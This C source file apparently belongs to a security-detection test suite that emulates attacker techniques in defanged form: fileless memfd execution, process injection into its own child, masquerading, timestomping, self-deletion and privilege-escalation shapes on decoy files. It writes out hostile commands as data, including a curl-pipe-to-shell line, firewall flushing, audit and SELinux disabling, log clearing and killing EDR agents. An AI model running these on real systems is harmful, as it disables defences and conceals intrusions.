// SPDX-License-Identifier: GPL-3.0-only
// Copyright (c) 2026 MikiMiku (MoreMorePwn)
//
// anti-analysis.c — in-memory execution, process injection, defence evasion and
// privilege shapes.
//
// The memfd sample writes a copy of itself into an anonymous memfd, maps it
// PROT_READ|PROT_WRITE|PROT_EXEC and re-executes it in a child that exits
// immediately. The executed bytes are this binary, not downloaded content.
//
// The injection sample only ever targets a child process it forked itself,
// and only into a scratch buffer of that child. Calls that would change the
// system (syslog clear, bind-mounting over /proc/PID, chattr, file
// capabilities, setns) are made on arguments the kernel refuses (EINVAL,
// ENOENT, EBADF); the tool-shaped ones (iptables, auditctl, pkill, ...) are
// exec stand-ins whose argument vector is the only thing that is real.
#include "samples.h"

#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/personality.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <time.h>
#include <unistd.h>

#ifndef SYS_io_uring_setup
#define SYS_io_uring_setup 425
#endif

extern char **environ;

// FS_IOC_SETFLAGS (chattr) with the flags word behind `flags`.
static int ioctl_setflags(int fd, unsigned *flags)
{
    return ioctl(fd, 0x40086602UL, flags);
}

SCENARIO(memfd_exec)
{
    const char *name = "memfd-exec";
    int self = open("/proc/self/exe", O_RDONLY | O_CLOEXEC);
    if (self < 0) {
        sample_fail(name, "/proc/self/exe: %s", strerror(errno));
        return 1;
    }
    struct stat info;
    if (fstat(self, &info) != 0 || info.st_size <= 0) {
        sample_fail(name, "fstat: %s", strerror(errno));
        close(self);
        return 1;
    }
    size_t size = (size_t)info.st_size;
    if (size > (8u << 20)) {
        sample_fail(name, "sample is %zu bytes; the 8 MiB cap applies", size);
        close(self);
        return 1;
    }
    int fd = memfd_create("demo-stage", MFD_CLOEXEC);
    if (fd < 0) {
        sample_unavailable(name, "memfd_create: %s", strerror(errno));
        close(self);
        return 0;
    }
    int ok = ftruncate(fd, (off_t)size) == 0;
    char buffer[65536];
    size_t copied = 0;
    ssize_t got;
    while (ok && (got = read(self, buffer, sizeof buffer)) > 0 && copied <= size) {
        copied += (size_t)got;
        ok = sample_write_all(fd, buffer, (size_t)got) == 0;
    }
    close(self);
    if (!ok) {
        sample_fail(name, "writing %zu bytes into the memfd: %s", size, strerror(errno));
        close(fd);
        return 1;
    }

    // RWX first; kernels or policies that refuse W^X still give the
    // RW mapping plus an explicit PROT_EXEC mprotect.
    int rwx = 0;
    void *mapping = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, 0);
    if (mapping == MAP_FAILED) {
        mapping = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
        if (mapping != MAP_FAILED)
            rwx = mprotect(mapping, size, PROT_READ | PROT_EXEC) == 0;
    } else {
        rwx = 1;
    }
    unsigned magic = 0;
    if (mapping != MAP_FAILED)
        memcpy(&magic, mapping, sizeof magic);

    // Write-then-execute on anonymous memory: a page mapped writable, then
    // made executable. Nothing is ever run from it.
    int wx = 0;
    void *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page != MAP_FAILED) {
        memset(page, 0xc3, 64);
        wx = mprotect(page, 4096, PROT_READ | PROT_EXEC) == 0;
        munmap(page, 4096);
    }
    // A file the run wrote, mapped executable as a library would be. It is
    // text, never loaded or run, and a noexec mount only makes the map fail.
    int dropped_library = -1;
    char library_dir[600], library[700];
    if (sample_path(library_dir, sizeof library_dir, options->workdir, ".cache") == 0 &&
        sample_mkdir_p(library_dir) == 0 && sample_path(library, sizeof library, library_dir, "libdemo.so") == 0 &&
        sample_write_text(library, "DEMO-DECOY placeholder, not a shared object\n") == 0) {
        int fd_library = open(library, O_RDONLY | O_CLOEXEC);
        if (fd_library >= 0) {
            void *view = mmap(NULL, 4096, PROT_READ | PROT_EXEC, MAP_PRIVATE, fd_library, 0);
            dropped_library = view != MAP_FAILED;
            if (view != MAP_FAILED)
                munmap(view, 4096);
            close(fd_library);
        }
    }
    // A refused RWX mapping (a zero length is always EINVAL): the "attempt" row.
    void *refused = mmap(NULL, 0, PROT_READ | PROT_WRITE | PROT_EXEC,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    int refused_errno = errno;

    int pipefd[2];
    if (pipe2(pipefd, O_CLOEXEC) != 0) {
        sample_fail(name, "pipe: %s", strerror(errno));
        if (mapping != MAP_FAILED)
            munmap(mapping, size);
        close(fd);
        return 1;
    }
    pid_t child = fork();
    if (child < 0) {
        sample_fail(name, "fork: %s", strerror(errno));
        close(pipefd[0]);
        close(pipefd[1]);
        if (mapping != MAP_FAILED)
            munmap(mapping, size);
        close(fd);
        return 1;
    }
    if (child == 0) {
        close(pipefd[0]);
        setenv("SAMPLE_MEMFD_CHILD", "1", 1);
        char *const argv[] = {(char *)"demo-stage", NULL};
        fexecve(fd, argv, environ);
        int saved = errno;
        ssize_t ignored = write(pipefd[1], &saved, sizeof saved);
        (void)ignored;
        _exit(127);
    }
    close(pipefd[1]);
    int child_errno = 0;
    ssize_t child_got = read(pipefd[0], &child_errno, sizeof child_errno);
    close(pipefd[0]);
    int status = 0;
    waitpid(child, &status, 0);
    if (mapping != MAP_FAILED)
        munmap(mapping, size);
    close(fd);

    // The same image reached through a descriptor of a plain file: the path
    // /proc/self/fd/N, which is an exec with no name of its own.
    char self_path[512];
    int fileless = -1;
    if (sample_self_path(self_path, sizeof self_path) == 0) {
        int plain = open(self_path, O_RDONLY);
        if (plain >= 0) {
            char via[64];
            snprintf(via, sizeof via, "/proc/self/fd/%d", plain);
            char *const argv[] = {(char *)"demo-stage", NULL};
            fileless = sample_spawn(via, argv, NULL, "exit", NULL);
            close(plain);
        }
    }

    const char *mapped = mapping == MAP_FAILED ? "unmapped"
                         : rwx                  ? "RWX"
                                                : "RW+mprotect(RX)";
    if (child_got == (ssize_t)sizeof child_errno)
        sample_note(name, "fexecve failed with %s; nothing ran", strerror(child_errno));
    else if (WIFEXITED(status) && WEXITSTATUS(status) == 0)
        sample_note(name, "child exited 0 after re-executing from the memfd");
    else
        sample_note(name, "child ended with wait status 0x%x", status);
    sample_note(name, "W then X on an anonymous page: %s; a written file mapped executable: %s; "
                   "RWX with a zero length: %s",
             wx ? "mprotect accepted" : "refused",
             dropped_library > 0 ? "mapped" : "refused",
             refused == MAP_FAILED ? strerror(refused_errno) : "unexpectedly mapped");
    if (fileless != 0)
        sample_unavailable(name, "exec through /proc/self/fd/N ended with %d", fileless);
    sample_pass(name, "%zu bytes into memfd \"demo-stage\", %s mapping (magic 0x%08x), "
                   "fileless exec %s",
             size, mapped, magic, fileless == 0 ? "ok" : "not run");
    if (refused != MAP_FAILED)
        munmap(refused, 0);
    return 0;
}

// ---- process injection against the sample's own child ------------------------

static char scratch[4096] = "scratch-before";

struct victim {
    pid_t pid;
    int release;
};

static int start_victim(struct victim *victim)
{
    int channel[2];
    if (pipe2(channel, O_CLOEXEC) != 0)
        return -1;
    fflush(stdout);
    pid_t child = fork();
    if (child < 0) {
        close(channel[0]);
        close(channel[1]);
        return -1;
    }
    if (child == 0) {
        close(channel[1]);
        // Waits for the parent to let go, at most five seconds.
        struct pollfd ready = {.fd = channel[0], .events = POLLIN};
        poll(&ready, 1, 5000);
        _exit(0);
    }
    close(channel[0]);
    victim->pid = child;
    victim->release = channel[1];
    return 0;
}

static void end_victim(struct victim *victim)
{
    char byte = 'x';
    ssize_t ignored = write(victim->release, &byte, 1);
    (void)ignored;
    close(victim->release);
    int status = 0;
    for (int waited = 0; waited < 1000; waited += 10) {
        if (waitpid(victim->pid, &status, WNOHANG) == victim->pid)
            return;
        struct timespec pause = {.tv_sec = 0, .tv_nsec = 10 * 1000000L};
        nanosleep(&pause, NULL);
    }
    kill(victim->pid, SIGKILL);
    waitpid(victim->pid, &status, 0);
}

static int seize_parent(void *context)
{
    (void)context;
    // PTRACE_SEIZE does not stop the parent; exiting releases it again.
    return ptrace(PTRACE_SEIZE, getppid(), NULL, NULL) == 0 ? 0 : 1;
}

SCENARIO(inject_sim)
{
    const char *name = "inject-sim";
    struct victim victim;
    if (start_victim(&victim) != 0) {
        sample_fail(name, "could not start the target child: %s", strerror(errno));
        return 1;
    }
    int steps = 0, done = 0;

    // ptrace attach, a poke and a register read, all on the child.
    steps++;
    if (ptrace(PTRACE_ATTACH, victim.pid, NULL, NULL) == 0) {
        int status = 0;
        int stopped = 0;
        for (int waited = 0; waited < 1000 && !stopped; waited += 10) {
            if (waitpid(victim.pid, &status, WNOHANG) == victim.pid)
                stopped = WIFSTOPPED(status);
            else {
                struct timespec pause = {.tv_sec = 0, .tv_nsec = 10 * 1000000L};
                nanosleep(&pause, NULL);
            }
        }
        if (stopped) {
            long word = 0x4141414141414141L;
            ptrace(PTRACE_POKEDATA, victim.pid, scratch, (void *)word);
            ptrace(PTRACE_PEEKDATA, victim.pid, scratch, NULL);
            done++;
        }
        ptrace(PTRACE_DETACH, victim.pid, NULL, NULL);
    } else {
        sample_note(name, "PTRACE_ATTACH refused: %s", strerror(errno));
    }

    // process_vm_writev and process_vm_readv against the same scratch buffer.
    steps++;
    char patch[16] = "PATCHED-BY-SIM";
    char readback[16];
    struct iovec local_write = {.iov_base = patch, .iov_len = sizeof patch};
    struct iovec local_read = {.iov_base = readback, .iov_len = sizeof readback};
    struct iovec remote = {.iov_base = scratch, .iov_len = sizeof patch};
    if (process_vm_writev(victim.pid, &local_write, 1, &remote, 1, 0) > 0 &&
        process_vm_readv(victim.pid, &local_read, 1, &remote, 1, 0) > 0)
        done++;
    else
        sample_note(name, "process_vm_*: %s", strerror(errno));

    // /proc/PID/mem of the child: write, then read.
    steps++;
    char mem_path[64];
    snprintf(mem_path, sizeof mem_path, "/proc/%d/mem", (int)victim.pid);
    int mem = open(mem_path, O_RDWR | O_CLOEXEC);
    if (mem >= 0) {
        char again[9] = "MEMWRITE";
        if (pwrite(mem, again, 8, (off_t)(uintptr_t)scratch) == 8)
            done++;
        close(mem);
    } else {
        sample_note(name, "%s for writing: %s", mem_path, strerror(errno));
    }
    mem = open(mem_path, O_RDONLY | O_CLOEXEC);
    if (mem >= 0) {
        char peek[8];
        ssize_t ignored = pread(mem, peek, sizeof peek, (off_t)(uintptr_t)scratch);
        (void)ignored;
        close(mem);
    }

    // The process's own memory, written by itself.
    steps++;
    int own = open("/proc/self/mem", O_WRONLY | O_CLOEXEC);
    if (own >= 0) {
        char mark[4] = "own";
        if (pwrite(own, mark, sizeof mark, (off_t)(uintptr_t)scratch + 32) == (ssize_t)sizeof mark)
            done++;
        close(own);
    }

    // A child that seizes its parent (the sample) and exits, releasing it.
    steps++;
    if (sample_in_child(seize_parent, NULL, 2000) == 0)
        done++;
    else
        sample_note(name, "PTRACE_SEIZE on the parent was refused (a tracer or Yama policy)");

    end_victim(&victim);

    // LD_PRELOAD in the environment of a program this sample starts: the
    // library does not exist and the binary is static, so nothing is loaded.
    char preload[640];
    char library[600];
    sample_path(library, sizeof library, options->workdir, "libdemo.so");
    snprintf(preload, sizeof preload, "LD_PRELOAD=%s", library);
    char *const env[] = {preload, (char *)"LD_LIBRARY_PATH=/tmp/.demo-sample", NULL};
    char *const argv[] = {(char *)"demo-preload", NULL};
    steps++;
    if (sample_spawn("/proc/self/exe", argv, env, "exit", NULL) == 0)
        done++;

    sample_pass(name, "%d/%d injection steps against child pid %d (attach+poke, vm_writev/readv, "
                   "/proc/PID/mem, own mem, seize parent, LD_PRELOAD env)",
             done, steps, (int)victim.pid);
    sample_note(name, "the target is always the sample's own child; scratch buffer only");
    return 0;
}

// ---- defence evasion -------------------------------------------------------------

static int masquerade_body(void *context)
{
    (void)context;
    prctl(PR_SET_NAME, "kworker/0:1H", 0, 0, 0);
    prctl(PR_SET_NAME, "sshd", 0, 0, 0);
    prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
    // Address-space randomisation off, for this child only.
    personality(ADDR_NO_RANDOMIZE);
    return 0;
}

static int seccomp_body(void *context)
{
    (void)context;
    struct sock_filter allow[] = {BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)};
    struct sock_fprog program = {.len = 1, .filter = allow};
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    return syscall(SYS_seccomp, SECCOMP_SET_MODE_FILTER, 0, &program) == 0 ? 0 : 1;
}

static int bpf_body(void *context)
{
    (void)context;
    // BPF_PROG_LOAD of the smallest socket filter: r0 = 0; exit. It is never attached.
    struct bpf_insn {
        unsigned char code;
        unsigned char regs;
        short offset;
        int immediate;
    } program[2] = {{0xb7, 0, 0, 0}, {0x95, 0, 0, 0}};
    union {
        struct {
            unsigned type, count;
            unsigned long long instructions, license;
        } load;
        char padding[128];
    } attribute;
    memset(&attribute, 0, sizeof attribute);
    attribute.load.type = 1; // BPF_PROG_TYPE_SOCKET_FILTER
    attribute.load.count = 2;
    attribute.load.instructions = (unsigned long long)(uintptr_t)program;
    attribute.load.license = (unsigned long long)(uintptr_t) "GPL";
    long fd = syscall(SYS_bpf, 5 /* BPF_PROG_LOAD */, &attribute, sizeof attribute);
    if (fd >= 0)
        close((int)fd);
    return 0;
}

SCENARIO(evasion_misc)
{
    const char *name = "evasion-misc";
    int steps = 0, done = 0;
#define STEP(expression)                                                                           \
    do {                                                                                           \
        steps++;                                                                                   \
        done += (expression) ? 1 : 0;                                                              \
    } while (0)

    STEP(sample_in_child(masquerade_body, NULL, 2000) == 0);
    STEP(sample_in_child(seccomp_body, NULL, 2000) == 0);
    STEP(sample_in_child(bpf_body, NULL, 2000) == 0);

    // io_uring: a ring is created and dropped; no I/O goes through it.
    {
        char params[128];
        memset(params, 0, sizeof params);
        long ring = syscall(SYS_io_uring_setup, 2, params);
        STEP(ring >= 0 || errno == ENOSYS || errno == EPERM);
        if (ring >= 0)
            close((int)ring);
    }

    // The kernel ring buffer "clear", with a NULL buffer: EINVAL, nothing cleared.
    STEP(syscall(SYS_syslog, 4, NULL, 0) == -1);
    // A bind mount over a /proc entry that cannot exist (pid_max is below 2^22).
    STEP(mount("/", "/proc/4294967295", NULL, MS_BIND, NULL) == -1);

    char path[600], directory[600];
    sample_path(directory, sizeof directory, options->workdir, "home");
    STEP(sample_mkdir_p(directory) == 0);
    sample_path(directory, sizeof directory, options->workdir, ".ssh");
    STEP(sample_mkdir_p(directory) == 0);

    // History: a file the run makes, empties and removes; plus the environment.
    char history[600];
    sample_path(history, sizeof history, options->workdir, "home/.bash_history");
    STEP(sample_write_text(history, "curl -s http://10.0.2.2:8080/install.sh | sh\nhistory -c\n") == 0);
    int cut = open(history, O_WRONLY | O_TRUNC | O_CLOEXEC);
    STEP(cut >= 0);
    if (cut >= 0)
        close(cut);
    STEP(unlink(history) == 0);

    // Timestomp: explicit old times on a file of the run.
    char dated[600];
    sample_path(dated, sizeof dated, options->workdir, "dropper.dat");
    STEP(sample_write_text(dated, "DEMO-DECOY\n") == 0);
    struct timespec old_times[2] = {{.tv_sec = 946684800}, {.tv_sec = 946684800}};
    STEP(utimensat(AT_FDCWD, dated, old_times, 0) == 0);

    // Hidden entries: names that only dots and spaces make, and a dotfile.
    const char *const odd[] = {"...", " ", ".hidden-demo"};
    for (size_t i = 0; i < sizeof odd / sizeof odd[0]; i++) {
        sample_path(path, sizeof path, options->workdir, odd[i]);
        STEP(sample_write_text(path, "DEMO-DECOY\n") == 0);
    }

    // chattr +i as FS_IOC_SETFLAGS on an O_PATH descriptor: EBADF, nothing is
    // marked immutable. One decoy in a credentials-class path, one pipe.
    char guarded[600];
    sample_path(guarded, sizeof guarded, options->workdir, ".ssh/authorized_keys");
    STEP(sample_write_text(guarded, "ssh-ed25519 AAAADEMODECOY demo@example.invalid\n") == 0);
    int flagged = open(guarded, O_PATH | O_CLOEXEC);
    unsigned flags = 0x10; // FS_IMMUTABLE_FL
    STEP(flagged >= 0 && ioctl_setflags(flagged, &flags) == -1);
    if (flagged >= 0)
        close(flagged);
    int pipes[2];
    if (pipe2(pipes, O_CLOEXEC) == 0) {
        STEP(ioctl_setflags(pipes[0], &flags) == -1);
        close(pipes[0]);
        close(pipes[1]);
    }

    // A copy of this binary that removes itself while it runs.
    char dropped[600];
    char self[512];
    sample_path(directory, sizeof directory, options->workdir, ".cache");
    sample_mkdir_p(directory);
    sample_path(dropped, sizeof dropped, options->workdir, ".cache/.svc");
    if (sample_self_path(self, sizeof self) == 0 && sample_copy_file(self, dropped, 0700, 8u << 20) == 0) {
        char out[700];
        snprintf(out, sizeof out, "SAMPLE_NOOP_OUT=%s", dropped);
        char *const env[] = {out, NULL};
        char *const argv[] = {(char *)".svc", NULL};
        STEP(sample_spawn(dropped, argv, env, "selfdelete", NULL) == 0 && access(dropped, F_OK) != 0);
    } else {
        sample_unavailable(name, "self-delete copy: %s", strerror(errno));
    }

    // Exec stand-ins: the argument vector is the shape.
    char *const not_run_env[] = {(char *)"HISTFILE=/dev/null", NULL};
    char *const quiet[] = {(char *)"bash", (char *)"--norc", NULL};
    STEP(sample_spoof(quiet, not_run_env) == 0);
    static const struct spoof tools[] = {
        {"evasion.firewall_modify", {"iptables", "-F", NULL}},
        {"evasion.audit_disable", {"auditctl", "-e", "0", NULL}},
        {"evasion.audit_disable", {"systemctl", "stop", "auditd", NULL}},
        {"evasion.security_disable", {"setenforce", "0", NULL}},
        {"evasion.security_disable", {"systemctl", "stop", "apparmor", NULL}},
        {"evasion.log_clear", {"journalctl", "--vacuum-time=1s", NULL}},
        {"evasion.history_clear", {"history", "-c", NULL}},
        {"evasion.immutable_attr", {"chattr", "+i", "authorized_keys", NULL}},
        {"evasion.kill_list", {"pkill", "-9", "edr-agent", "av-agent", "monitor-agent", NULL}},
        {"evasion.masquerade_kthread", {"[kworker/u8:2]", NULL}},
        {"evasion.masquerade_daemon", {"systemd-journald", NULL}},
    };
    int ran = sample_spoof_all(name, tools, sizeof tools / sizeof tools[0]);
    steps += (int)(sizeof tools / sizeof tools[0]);
    done += ran;
#undef STEP
    sample_pass(name, "%d/%d evasion steps completed (children for prctl/seccomp/bpf, refused "
                   "syslog/mount/chattr calls, hidden names, history, timestomp, self-delete, "
                   "%d stand-in commands)",
             done, steps, ran);
    sample_note(name, "nothing was cleared, mounted, locked or killed: the calls were given "
                   "arguments the kernel refuses, and the tools are not run");
    return 0;
}

// ---- privilege shapes --------------------------------------------------------------

static int userns_body(void *context)
{
    (void)context;
    return unshare(CLONE_NEWUSER) == 0 ? 0 : 1;
}

static int setns_body(void *context)
{
    (void)context;
    int fd = open("/proc/1/ns/mnt", O_RDONLY | O_CLOEXEC);
    if (fd < 0)
        return 2;
    // A mount-namespace descriptor with a network-namespace type: EINVAL.
    int result = setns(fd, CLONE_NEWNET);
    close(fd);
    return result == -1 && errno == EINVAL ? 0 : 1;
}

static int drop_body(void *context)
{
    (void)context;
    if (geteuid() != 0)
        return 2;
    if (setresgid(65534, 65534, 65534) != 0)
        return 1;
    return setresuid(65534, 65534, 65534) == 0 ? 0 : 1;
}

SCENARIO(privesc_sim)
{
    const char *name = "privesc-sim";
    int steps = 0, done = 0;
#define STEP(expression)                                                                           \
    do {                                                                                           \
        steps++;                                                                                   \
        done += (expression) ? 1 : 0;                                                              \
    } while (0)
    char path[600], directory[600];

    // setuid and setgid bits on an inert text file, taken back at once.
    sample_path(directory, sizeof directory, options->workdir, "demo-bin");
    sample_mkdir_p(directory);
    sample_path(path, sizeof path, directory, "suid-demo");
    STEP(sample_write_text(path, "DEMO-DECOY: inert text, not an executable\n") == 0);
    STEP(chmod(path, 04755) == 0);
    STEP(chmod(path, 02755) == 0);
    STEP(chmod(path, 0600) == 0);
    // A file capability with a malformed value: refused as EINVAL.
    STEP(setxattr(path, "security.capability", "bad", 3, 0) == -1);

    STEP(sample_in_child(userns_body, NULL, 2000) == 0);
    int namespaced = sample_in_child(setns_body, NULL, 2000);
    steps++;
    if (namespaced == 0)
        done++;
    else if (namespaced == 2)
        sample_unavailable(name, "/proc/1/ns/mnt cannot be opened here (needs root); the setns "
                              "row will be missing");

    // The container-engine socket: no engine, so the connect fails.
    int sock = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
    if (sock >= 0) {
        struct sockaddr_un address;
        memset(&address, 0, sizeof address);
        address.sun_family = AF_UNIX;
        snprintf(address.sun_path, sizeof address.sun_path, "/var/run/docker.sock");
        // Nothing is sent, and no engine is expected to be listening.
        int refused = connect(sock, (struct sockaddr *)&address, sizeof address);
        (void)refused;
        steps++;
        done++;
        close(sock);
    }
    char *const nsenter[] = {"nsenter", "-t", "1", "-m", "-u", "-n", "-i", "sh", NULL};
    STEP(sample_spoof(nsenter, NULL) == 0);

    // pkexec started with an empty argument vector: a copy named pkexec of this
    // binary, which does nothing when it starts.
    char self[512], link[600];
    sample_path(directory, sizeof directory, options->workdir, ".bin");
    sample_mkdir_p(directory);
    sample_path(link, sizeof link, directory, "pkexec");
    if (sample_self_path(self, sizeof self) == 0 && symlink(self, link) == 0) {
        char *const empty[] = {NULL};
        STEP(sample_spawn(link, empty, NULL, "exit", NULL) == 0);
    } else {
        sample_unavailable(name, "pkexec stand-in: %s", strerror(errno));
    }

    // The dirty-pipe pattern on a decoy: splice a file into a pipe, then write
    // into the same pipe. Only the decoy (a lookalike key) could ever change.
    char decoy[600];
    sample_path(directory, sizeof directory, options->workdir, ".ssh");
    sample_mkdir_p(directory);
    sample_path(decoy, sizeof decoy, directory, "id_rsa_pipe");
    if (sample_write_text(decoy, "DEMO-DECOY decoy key material, 0123456789\n") == 0) {
        int file = open(decoy, O_RDONLY | O_CLOEXEC);
        int channel[2];
        if (file >= 0 && pipe2(channel, O_CLOEXEC) == 0) {
            loff_t offset = 0;
            ssize_t moved = splice(file, &offset, channel[1], NULL, 1, 0);
            ssize_t pushed = write(channel[1], "AAAAAAAA", 8);
            char drain[64];
            ssize_t ignored = read(channel[0], drain, sizeof drain);
            (void)ignored;
            STEP(moved > 0 && pushed > 0);
            close(channel[0]);
            close(channel[1]);
        }
        if (file >= 0)
            close(file);
    }

    int dropped = sample_in_child(drop_body, NULL, 2000);
    if (dropped == 0) {
        steps++;
        done++;
    } else if (dropped == 2) {
        sample_note(name, "not root: the privilege.drop step is skipped");
    }
#undef STEP
    sample_pass(name, "%d/%d privilege steps (setid bits on an inert file, user namespace, "
                   "namespace and socket probes, pkexec shape, dirty-pipe shape)",
             done, steps);
    sample_note(name, "no rights are gained: the bits are cleared again, the file is text, the "
                   "setns and capability calls are given invalid arguments");
    return 0;
}
